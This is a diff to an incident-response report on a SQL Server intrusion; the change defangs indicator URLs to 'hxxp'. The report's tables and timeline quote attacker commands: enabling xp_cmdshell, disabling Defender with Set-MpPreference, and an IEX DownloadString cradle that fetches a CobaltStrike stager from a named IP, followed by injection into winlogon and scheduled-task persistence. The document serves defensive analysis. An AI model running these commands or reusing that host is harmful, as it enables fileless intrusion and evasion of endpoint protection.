@@ -476,7 +476,7 @@ MITRE ATT&CK:
 | Type | Value | Role |
 | --- | --- | --- |
 | IP Address | 5.188.91.243 | Attacker C2 — brute force source + payload host |
-| URL | [http://5.188.91.243/fJSYAso.ps1](http://5.188.91.243/fJSYAso.ps1) | PowerShell stager download URL |
+| URL | [hxxp://5.188.91.243/fJSYAso.ps1](hxxp://5.188.91.243/fJSYAso.ps1) | PowerShell stager download URL |
 
 ## Internal Hosts
 
@@ -499,7 +499,7 @@ MITRE ATT&CK:
 
 | Name | Path | Description |
 | --- | --- | --- |
-| fJSYAso.ps1 | [http://5.188.91.243/fJSYAso.ps1](http://5.188.91.243/fJSYAso.ps1) | In-memory CobaltStrike stager (IEX cradle) |
+| fJSYAso.ps1 | [hxxp://5.188.91.243/fJSYAso.ps1](hxxp://5.188.91.243/fJSYAso.ps1) | In-memory CobaltStrike stager (IEX cradle) |
 | UpdateCheck.ps1 | C:\Users\SQLService\Documents\UpdateCheck.ps1 | Persistence script |
 | `UpdateCheck` | Scheduled Task — /sc onlogon /ru System | Persistence mechanism on SQLServer |
 
@@ -560,7 +560,7 @@ MITRE ATT&CK:
 | 2023-12-14 06:43:52 | Execution | SQLServer | `show advanced options` enabled via `spid51` (`sa` session) — prerequisite for `xp_cmdshell` | T1505.001 |
 | 2023-12-14 06:44:08 | Execution | SQLServer | `xp_cmdshell` enabled — SQL Server engine granted OS command execution capability | T1505.001 |
 | 2023-12-14 14:45:11 | Defense Evasion | SQLServer | `sqlservr.exe` spawned `cmd.exe` via `xp_cmdshell` → `powershell "Set-MpPreference -DisableRealtimeMonitoring 1"` | T1562.001 |
-| 2023-12-14 14:45:25 | Execution | SQLServer | `sqlservr.exe` spawned `cmd.exe` → `IEX (New-Object Net.WebClient).DownloadString('<http://5.188.91.243/fJSYAso.ps1>')` — fileless stager loaded in memory | T1059.001, T1105 |
+| 2023-12-14 14:45:25 | Execution | SQLServer | `sqlservr.exe` spawned `cmd.exe` → `IEX (New-Object Net.WebClient).DownloadString('<hxxp://5.188.91.243/fJSYAso.ps1>')` — fileless stager loaded in memory | T1059.001, T1105 |
 | 2023-12-14 14:47:13 | Privilege Escalation | SQLServer | `powershell.exe` (PID 3096) injected shellcode into `winlogon.exe` (PID 596) via remote thread — escalated from `NEXTECH\\SQLService` to `NT AUTHORITY\\SYSTEM` | T1055, |
 | T1055.001 |  |  |  |  |
 | 2023-12-14 14:53:13 | Persistence | SQLServer | Injected `winlogon.exe` beacon created scheduled task `UpdateCheck` — `powershell -File UpdateCheck.ps1` on logon as SYSTEM | T1053.005 |
